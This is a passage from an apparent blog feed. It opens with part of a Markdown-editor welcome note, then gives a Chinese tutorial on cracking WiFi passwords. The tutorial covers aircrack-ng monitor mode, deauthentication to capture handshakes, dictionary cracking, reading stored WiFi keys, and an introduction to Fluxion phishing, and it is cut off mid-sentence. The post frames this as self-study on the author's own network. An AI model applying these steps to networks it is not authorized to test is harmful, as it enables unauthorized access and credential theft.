href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#13-待办事宜-todo-列表" target="_blank" rel="noopener">Todo 列表</a></h3><ul><li>[ ] 支持以 PDF 格式导出文稿</li><li>[ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率</li><li>[x] 新增 Todo 列表功能</li><li>[x] 修复 LaTex 公式渲染问题</li><li>[x] 新增 LaTex 公式编号功能</li></ul><h3 id="2-书写一个质能守恒公式LaTeX"><a href="#2-书写一个质能守恒公式LaTeX" class="headerlink" title="2. 书写一个质能守恒公式LaTeX"></a>2. 书写一个质能守恒公式<sup><a href="#fn_LaTeX" id="reffn_LaTeX">LaTeX</a></sup></h3><script type="math/tex; mode=display">E=mc^2</script><h3 id="3-高亮一段代码code"><a href="#3-高亮一段代码code" class="headerlink" title="3. 高亮一段代码code"></a>3. 高亮一段代码<sup><a href="#fn_code" id="reffn_code">code</a></sup></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@requires_authorization</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeClass</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># A comment</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'hello world'</span></span><br></pre></td></tr></table></figure><h3 id="4-高效绘制-流程图"><a href="#4-高效绘制-流程图" class="headerlink" title="4. 高效绘制 流程图"></a>4. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#7-流程图" target="_blank" rel="noopener">流程图</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">op=&gt;operation: Your Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure><h3 id="5-高效绘制-序列图"><a href="#5-高效绘制-序列图" class="headerlink" title="5. 高效绘制 序列图"></a>5. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#8-序列图" target="_blank" rel="noopener">序列图</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Alice-&gt;Bob: Hello Bob, how are you?</span><br><span class="line">Note right of Bob: Bob thinks</span><br><span class="line">Bob--&gt;Alice: I am good thanks!</span><br></pre></td></tr></table></figure><h3 id="6-高效绘制-甘特图"><a href="#6-高效绘制-甘特图" class="headerlink" title="6. 高效绘制 甘特图"></a>6. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#9-甘特图" target="_blank" rel="noopener">甘特图</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">title 项目开发流程</span><br><span class="line">section 项目确定</span><br><span class="line">    需求分析       :a1, 2016-06-22, 3d</span><br><span class="line">    可行性报告     :after a1, 5d</span><br><span class="line">    概念验证       : 5d</span><br><span class="line">section 项目实施</span><br><span class="line">    概要设计      :2016-07-05  , 5d</span><br><span class="line">    详细设计      :2016-07-08, 10d</span><br><span class="line">    编码          :2016-07-15, 10d</span><br><span class="line">    测试          :2016-07-22, 5d</span><br><span class="line">section 发布验收</span><br><span class="line">    发布: 2d</span><br><span class="line">    验收: 3d</span><br></pre></td></tr></table></figure><h3 id="7-绘制表格"><a href="#7-绘制表格" class="headerlink" title="7. 绘制表格"></a>7. 绘制表格</h3><div class="table-container"><table><thead><tr><th>项目</th><th style="text-align:right">价格</th><th style="text-align:center">数量</th></tr></thead><tbody><tr><td>计算机</td><td style="text-align:right">\$1600</td><td style="text-align:center">5</td></tr><tr><td>手机</td><td style="text-align:right">\$12</td><td style="text-align:center">12</td></tr><tr><td>管线</td><td style="text-align:right">\$1</td><td style="text-align:center">234</td></tr></tbody></table></div><h3 id="8-更详细语法说明"><a href="#8-更详细语法说明" class="headerlink" title="8. 更详细语法说明"></a>8. 更详细语法说明</h3><p>想要查看更详细的语法说明，可以参考我们准备的 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown" target="_blank" rel="noopener">Cmd Markdown 简明语法手册</a>，进阶用户可以参考 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#cmd-markdown-高阶语法手册" target="_blank" rel="noopener">Cmd Markdown 高阶语法手册</a> 了解更多高级功能。</p><p>总而言之，不同于其它 <em>所见即所得</em> 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。<strong>Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。</strong> 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。</p><hr><h2 id="什么是-Cmd-Markdown"><a href="#什么是-Cmd-Markdown" class="headerlink" title="什么是 Cmd Markdown"></a>什么是 Cmd Markdown</h2><p>您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 <strong>编辑/发布/阅读</strong> Markdown 的在线平台——您可以在任何地方，任何系统/设备上管理这里的文字。</p><h3 id="1-实时同步预览"><a href="#1-实时同步预览" class="headerlink" title="1. 实时同步预览"></a>1. 实时同步预览</h3><p>我们将 Cmd Markdown 的主界面一分为二，左边为<strong>编辑区</strong>，右边为<strong>预览区</strong>，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！</p><h3 id="2-编辑工具栏"><a href="#2-编辑工具栏" class="headerlink" title="2. 编辑工具栏"></a>2. 编辑工具栏</h3><p>也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 <strong>编辑区</strong> 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。</p><p><img src="https://www.zybuluo.com/static/img/toolbar-editor.png" alt="tool-editor"></p><h3 id="3-编辑模式"><a href="#3-编辑模式" class="headerlink" title="3. 编辑模式"></a>3. 编辑模式</h3><p>完全心无旁骛的方式编辑文字：点击 <strong>编辑工具栏</strong> 最右侧的拉伸按钮或者按下 <code>Ctrl + M</code>，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！</p><h3 id="4-实时的云端文稿"><a href="#4-实时的云端文稿" class="headerlink" title="4. 实时的云端文稿"></a>4. 实时的云端文稿</h3><p>为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 <strong>编辑工具栏</strong> 的最右侧提示 <code>已保存</code> 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。</p><h3 id="5-离线模式"><a href="#5-离线模式" class="headerlink" title="5. 离线模式"></a>5. 离线模式</h3><p>在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。</p><h3 id="6-管理工具栏"><a href="#6-管理工具栏" class="headerlink" title="6. 管理工具栏"></a>6. 管理工具栏</h3><p>为了便于管理您的文稿，在 <strong>预览区</strong> 的顶部放置了如下所示的 <strong>管理工具栏</strong>：</p><p><img src="https://www.zybuluo.com/static/img/toolbar-manager.jpg" alt="tool-manager"></p><p>通过管理工具栏可以：</p><p><i class="icon-share">&lt;/i&gt; 发布：将当前的文稿生成固定链接，在网络上发布，分享<br><i class="icon-file"></i> 新建：开始撰写一篇新的文稿<br><i class="icon-trash">&lt;/i&gt; 删除：删除当前的文稿<br><i class="icon-cloud"></i> 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地<br><i class="icon-reorder">&lt;/i&gt; 列表：所有新增和过往的文稿都可以在这里查看、操作<br><i class="icon-pencil"></i> 模式：切换 普通/Vim/Emacs 编辑模式</i></i></i></p><h3 id="7-阅读工具栏"><a href="#7-阅读工具栏" class="headerlink" title="7. 阅读工具栏"></a>7. 阅读工具栏</h3><p><img src="https://www.zybuluo.com/static/img/toolbar-reader.jpg" alt="tool-manager"></p><p>通过 <strong>预览区</strong> 右上角的 <strong>阅读工具栏</strong>，可以查看当前文稿的目录并增强阅读体验。</p><p>工具栏上的五个图标依次为：</p><p><i class="icon-list">&lt;/i&gt; 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落<br><i class="icon-chevron-sign-left"></i> 视图：互换左边编辑区和右边预览区的位置<br><i class="icon-adjust">&lt;/i&gt; 主题：内置了黑白两种模式的主题，试试 <strong>黑色主题</strong>，超炫！<br><i class="icon-desktop"></i> 阅读：心无旁骛的阅读模式提供超一流的阅读体验<br><i class="icon-fullscreen"></i> 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境</i></i></p><h3 id="8-阅读模式"><a href="#8-阅读模式" class="headerlink" title="8. 阅读模式"></a>8. 阅读模式</h3><p>在 <strong>阅读工具栏</strong> 点击 <i class="icon-desktop"></i> 或者按下 <code>Ctrl+Alt+M</code> 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。</p><h3 id="9-标签、分类和搜索"><a href="#9-标签、分类和搜索" class="headerlink" title="9. 标签、分类和搜索"></a>9. 标签、分类和搜索</h3><p>在编辑区任意行首位置输入以下格式的文字可以标签当前文档：</p><p>标签： 未分类</p><p>标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：</p><p><img src="https://www.zybuluo.com/static/img/file-list.png" alt="file-list"></p><h3 id="10-文稿发布和分享"><a href="#10-文稿发布和分享" class="headerlink" title="10. 文稿发布和分享"></a>10. 文稿发布和分享</h3><p>在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 <i class="icon-share"></i> (Ctrl+Alt+P) 发布这份文档给好友吧！</p><hr><p>再一次感谢您花费时间阅读这份欢迎稿，点击 <i class="icon-file"></i> (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！</p><p>作者 <a href="http://weibo.com/ghosert" target="_blank" rel="noopener">@ghosert</a><br>2016 年 07月 07日    </p><blockquote id="fn_LaTeX"><sup>LaTeX</sup>. 支持 <strong>LaTeX</strong> 编辑显示支持，例如：$\sum_{i=1}^n a_i=0$， 访问 <a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference" target="_blank" rel="noopener">MathJax</a> 参考更多使用方法。<a href="#reffn_LaTeX" title="Jump back to footnote [LaTeX] in the text."> &#8617;</a></blockquote><blockquote id="fn_code"><sup>code</sup>. 代码高亮功能支持包括 Java, Python, JavaScript 在内的，<strong>四十一</strong>种主流编程语言。<a href="#reffn_code" title="Jump back to footnote [code] in the text."> &#8617;</a></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，&lt;strong&gt;Cmd Markdown&lt;/strong&gt; 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown：&lt;/p&gt;

      
    
    </summary>
    
      <category term="笔记" scheme="https://muzimz.cn/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://muzimz.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>WIFI破解</title>
    <link href="https://muzimz.cn/2018/10/12/WIFI%E7%A0%B4%E8%A7%A3/"/>
    <id>https://muzimz.cn/2018/10/12/WIFI破解/</id>
    <published>2018-10-12T11:47:07.000Z</published>
    <updated>2019-03-05T12:22:31.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><p>正如<a href="https://book.douban.com/subject/10433737/" target="_blank" rel="noopener">《Metasploit渗透测试指南》</a>一书所述：</p><ul><li>不要进行恶意的攻击</li><li>不要做傻事</li><li>在没有获得书面授权时，不要攻击任何目标</li><li>考虑你的行为将会带来的后果</li><li>如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的</li></ul><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。</font><p><img src="http://ww4.sinaimg.cn/bmiddle/006APoFYjw1fa506lcjg8j30b40b4aat.jpg" width="300"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。</p><p>综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。</p><a id="more"></a><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul><li>系统：<a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux</a><br>可在其官网了解相关信息及下载iso镜像文件。</li><li>USB无线网卡<br>笔电内置的无线网卡不可用于Kali Linux的无线学习，我们需要购买一个外置的USB无线网卡，可根据自己的需要在<a href="https://www.taobao.com/" target="_blank" rel="noopener">某宝</a>进行购买。本文使用的是RT3070，购买链接是：<a href="https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail" target="_blank" rel="noopener">https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail</a></li></ul><h3 id="Kali安装及基本配置"><a href="#Kali安装及基本配置" class="headerlink" title="Kali安装及基本配置"></a>Kali安装及基本配置</h3><h4 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h4><p>目前主要使用的渗透工具主要有两种，一个是Backtrack，另一个是Kali，两者在使用上来讲并无差别，在本文中使用的是Kali Linux系统。</p><p>Kali官网及下载地址：<a href="https://www.kali.org/" target="_blank" rel="noopener">https://www.kali.org/</a></p><p>在官网下载好Kali Linux iso镜像文件之后，我们需要将其进行安装，一般有U盘安装、虚拟机安装、双系统等方式。本文只介绍VMware虚拟机中安装Kali的方式，有其他需要的朋友可自行查找相关资料。</p><p>Kali的安装总的来说和Ubuntu的安装并无一二，安装kali可暂且移步：<a href="https://jacklxj.github.io/2018/09/23/Xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E5%B9%B6%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEipython%E6%9C%8D%E5%8A%A1/" target="_blank" rel="noopener">Xshell远程连接linux并远程访问Jupyter notebook服务（深度学习环境的搭建）</a>，如下所示部分：<br><img src="http://pjq6e477y.bkt.clouddn.com/1.jpg" width="400"></p><p>在这里值得一说的是，在Kali安装的最后一步中，会有两个选择，一个是<code>手动输入设备</code>，另一个是<code>/dev/sda</code>，在这里我们务必选择<code>/dev/sda</code>，选择之后待其自动重启即可使用。</p><h4 id="Kali的基本配置"><a href="#Kali的基本配置" class="headerlink" title="Kali的基本配置"></a>Kali的基本配置</h4><blockquote><p>该部分内容以后有时间单独成文记录。</p></blockquote><h3 id="Fluxion安装"><a href="#Fluxion安装" class="headerlink" title="Fluxion安装"></a>Fluxion安装</h3><p>Fluxion的官方部分说明如下：</p><blockquote><p>Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) fewer bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phishing) attack. It’s compatible with the latest release of Kali (rolling). Fluxion’s attacks’ setup is mostly manual, but experimental auto-mode handles some of the attacks’ setup parameters. Read the FAQ before requesting issues.</p></blockquote><p>总的来说，Fluxion不同于一般的暴力wifi破解，它是通过社会工程学来获取WPA2秘钥。</p><p>Github地址：<a href="https://github.com/wi-fi-analyzer/fluxion.git" target="_blank" rel="noopener">https://github.com/wi-fi-analyzer/fluxion.git</a><br>官网地址：<a href="https://fluxionnetwork.github.io/fluxion/" target="_blank" rel="noopener">https://fluxionnetwork.github.io/fluxion/</a></p><p>在安装Kali Linux之后，虽然其就像Anaconda一样集成了大量的工具，但是默认是没有对Fluxion进行安装的，所以需要我们自行安装，此处安装使用git即可，命令如下：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/wi-fi-analyzer/fluxion.git</span><br></pre></td></tr></table></figure></p><p>不到一杯茶的功夫即可完成该下载过程。<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1504001096,2238756502&fm=26&gp=0.jpg"></p><hr><h2 id="WIFI破解"><a href="#WIFI破解" class="headerlink" title="WIFI破解"></a>WIFI破解</h2><h3 id="万能钥匙获取wifi秘钥"><a href="#万能钥匙获取wifi秘钥" class="headerlink" title="万能钥匙获取wifi秘钥"></a>万能钥匙获取wifi秘钥</h3><p>在wifi破解中，相信大家接触最多的就是万能钥匙了，但是只限连接部分的查询结果wifi，而且连接成功后绝大部分人并不知道连接的wifi密码，所以先从万能钥匙说起，由于万能钥匙不是本文的重点，所以在这只蜻蜓点水般介绍即可。</p><p>在连接万能钥匙之后，我们可以通过以下三种方式来获取秘钥。</p><ul><li>RE获取<br>进入RE管理器（手机默认文件管理器），打开<code>/data/misc/wpa_supplicant.conf</code>文件可见<code>psk</code>字段，即wifi明文秘钥。（操作前提需要ROOT）</li><li>微信获取<br>打开手机并进入无线wlan界面，点击你使用万能钥匙连接的wifi可见一个二维码，保存该二维码之后可使用微信进行扫描，扫描结果可见此wifi明文秘钥。</li><li>电脑获取<br>在终端使用如下命令可见秘钥<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show<span class="built_in"> profile </span>name=[wifi名] <span class="attribute">key</span>=<span class="string">"clear"</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Kali暴力破解"><a href="#Kali暴力破解" class="headerlink" title="Kali暴力破解"></a>Kali暴力破解</h3><h4 id="airmon-ng监听"><a href="#airmon-ng监听" class="headerlink" title="airmon-ng监听"></a><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng</a>监听</h4><p>插上USB无线网卡之后，我们将需要该网卡连接至Kali Linux系统中才能正常侦测到周围wifi，可根据<code>虚拟机 -&gt; 可移动设备 -&gt; USB连接</code>进行操作，如下图所示（这张图不太好截，手机拍的，根据图片操作即可）：<br><img src="/uploads/wifi破解/2.jpg" width="400"></p><p>之后，我们需要确认是否已经网卡的引入，可通过如下命令进行操作：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig -a</span></span><br></pre></td></tr></table></figure></p><p>输出结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/3.jpg" width="400"></p><p>若命令输出<code>wlan0</code>网卡，则说明已经映射成功，之后我们即可启动该网卡来进一步的进行侦测周围wifi，启动如下可根据如下命令进行（三部曲）：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭network-manager服务，已避免对网卡造成不必要的影响</span></span><br><span class="line">service network-manager stop </span><br><span class="line"><span class="comment"># 我们在使用暴力破解wifi时，会使用到airmon-ng，该命令可将对airmon-ng产生影响的进程kill掉</span></span><br><span class="line">airmon-ng check kill </span><br><span class="line"><span class="comment"># 启动wlan0网卡，处于监听（monitor）状态</span></span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p><img src="http://pjq6e477y.bkt.clouddn.com/5.jpg" width="400"></p><p>补充：</p><blockquote><p>查看影响<code>airmon-ng</code>使用的进程：<code>airmon-ng check</code><br>关闭监听（monitor）状态：<code>airmon-ng stop wlan0mon</code><br>重启<code>network-manager</code>服务：service network-manager restart<br>当无线网卡无法继续监听时，可尝试一下操作（重启）：</p><ol><li>ifconfig wlan0mon down</li><li>ifconfig wlan0mon up</li></ol></blockquote><h4 id="airodump-ng-探测"><a href="#airodump-ng-探测" class="headerlink" title="airodump-ng 探测"></a><a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> 探测</h4><p>在使用USB无线网卡监听之后，我们就能对周围的wifi进行探测了，该过程可以探测到包含了wifi的详细信息：BSSID、ESSID、信道等，对周围所有的wifi进行探测的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>命令执行结果如下图所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/6.jpg" width="400"></p><p>结果分析：</p><blockquote><p>BSSID：<code>Service Set Identifier</code>，站点的MAC地址，用于区分不同的网络，可理解为路由器的身份证<br>PWR：可理解为信号强度的体现，绝对值越小信号越强<br>Beacons：连接该wifi（AP）所发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。<br>#Data：数据传输量<br>#/s：过去10秒钟内每秒捕获数据分组的数量。<br>CH：信道<br>MB：AP的最大传输速率<br>ENC：加密方式<br>CIPHER：检测到的加密算法。这个不是特别懂。<br>AUTH：认证协议<br>ESSID：侦测到的wifi名</p></blockquote><p>更多详尽的专业解释可见：<a href="https://wenku.baidu.com/view/1907172e7375a417866f8f30.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/1907172e7375a417866f8f30.html</a></p><p>当你执行如上命令之后，的确可以侦测到附近所有的wifi接入点，但是我们确定了破解的wifi目标之后，我们需要对结果进行一些特定的限制（筛选）以便更为方便的分析，指定探测命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --bssid <span class="string">[目标MAC地址]</span> -c <span class="string">[频道]</span> -w <span class="string">[抓包结果的文件名]</span></span><br></pre></td></tr></table></figure></p><p>其中<code>STATION</code>表示目前连接该wifi下的设备的MAC地址</p><h4 id="aireplay-ng抓包"><a href="#aireplay-ng抓包" class="headerlink" title="aireplay-ng抓包"></a><a href="http://www.aircrack-ng.org/doku.php?id=aireplay-ng" target="_blank" rel="noopener">aireplay-ng</a>抓包</h4><p>对指定wifi进行探测之后，有时我们并不会主动对该wifi进行抓包操作，原因是在我们使用<code>airodump</code>的时候，原设备就已经连接到我们的目标wifi了，此时要想抓包，我们需要使用到<code>aireplay-ng</code>来对目标设备进行强制断开连接，待其自动连接之后我们也就抓到包了，命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[接入点MAC地址]</span> -c <span class="string">[客户端接入地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><p>执行结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/7.jpg" width="400"></p><p><img src="http://pjq6e477y.bkt.clouddn.com/8.jpg" width="400"></p><blockquote><p>解释：上述的包与爬虫抓包类似，可以简单的理解为含有我们需要重要信息的文件。</p></blockquote><h4 id="aircrack-ng-破解"><a href="#aircrack-ng-破解" class="headerlink" title="aircrack-ng 破解"></a><a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a> 破解</h4><p>通过上述操作，我们已经成功抓包了，通过以下命令来查看抓包文件:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root</span> &amp;&amp; <span class="keyword">ls</span></span><br></pre></td></tr></table></figure></p><p><img src="http://pjq6e477y.bkt.clouddn.com/9.jpg" width="400"></p><p>我们破解时主要用到的是<code>.cap</code>文件，破解命令如下：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典文件]</span> <span class="string">[.cap文件]</span></span><br></pre></td></tr></table></figure></p><p>Kali自带的字典文件目录有以下几个（比较小）：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/john/</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wfuzz/</span>wordlist/</span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wordlists/</span></span><br></pre></td></tr></table></figure></p><blockquote><p>解释：暴力破解，顾名思义就是我们需要准备一个尽量详尽且可能较大的字典文件，该文件中也许包含了小至以M为单位的秘钥文件，大至以G为单位的秘钥文件，然后使用<code>aircrack-ng</code>一个个去暴力破解，待其找到正确秘钥之后就会自动终止程序。通过如上解释，所以说如果我们的字典足够完整，也许在你睡一觉之后即可破解，此时的你需要对收获与时间成本进行考量，，还有一种情况就是几天下来直至字典跑完也没有成功破解wifi，原因就是使用的字典中未含有正确秘钥。</p><p>补充：1. 可通过彩虹表的方法来增大跑字典的效率。2. 可以使用GPU来增大跑字典的效率。3. 可使用kali内置的crunch工具自动生成字典。<br>以上补充有兴趣的可以去了解，这里就不详细说明了，有时间的话也许会在后面的文章单独成文。</p></blockquote><p>常用命令：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep [Password] [字典] <span class="comment"># 查看字典中是否含有目标秘钥</span></span><br><span class="line">cat [字典] | wc -l <span class="comment"># 查看字典文件有多少行数据</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/wordlists</span> &amp;&amp; gunzip rockyou.txt.gz <span class="comment"># 解压Kali自带rockyou.txt.gz文件</span></span><br></pre></td></tr></table></figure></p><p>使用<code>aircrack-ng</code>之后，如果破解成功将显示如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/10.jpg" width="400"></p><h3 id="Fluxion社会工程学破解"><a href="#Fluxion社会工程学破解" class="headerlink" title="Fluxion社会工程学破解"></a>Fluxion社会工程学破解</h3><p>以上是Kali暴力破解的内容，但往往我们使用暴力破解的结果不尽如人意，此时我们可以考虑Fluxion社会工程学来进行破解。社会工程学是很高深的一门学问，为了吊大家的胃口这里就简单的说下：好像是外国一名黑客入侵攻击之后被抓坐牢，然后出了一本书。强烈推荐大家去了解下，很有意思的 (￣_,￣ )，像许多电影亦或是电视剧都有相关内容的出现，比如《Who am 